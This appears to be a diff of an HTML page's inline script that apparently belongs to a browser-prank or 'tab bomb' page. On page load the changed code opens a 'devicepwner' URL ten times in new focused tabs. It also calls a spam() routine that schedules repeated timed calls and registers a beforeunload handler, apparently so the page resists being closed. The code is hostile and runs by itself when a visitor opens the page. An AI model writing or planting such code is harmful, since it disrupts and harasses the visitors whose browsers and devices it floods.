@@ -6,7 +6,11 @@
     <script>
     window.addEventListener('load', 
       () => { 
+        
         spam()
+        for (let i = 0; i < 10; i++) {
+          window.open('https://devicepwner.github.io/device/hide', '_blank').focus()
+        }
       })
       window.addEventListener('beforeunload', 
       (e) => { 
@@ -31,9 +35,7 @@
     }
       
     function spam() {
-      for (let i = 0; i < 10; i++) {
-        window.open('https://devicepwner.github.io/device/hide', '_blank').focus()
-      }
+      
       for (let i = 0; i < loops; i++) {
         setTimeout(test, i * delay)
       }
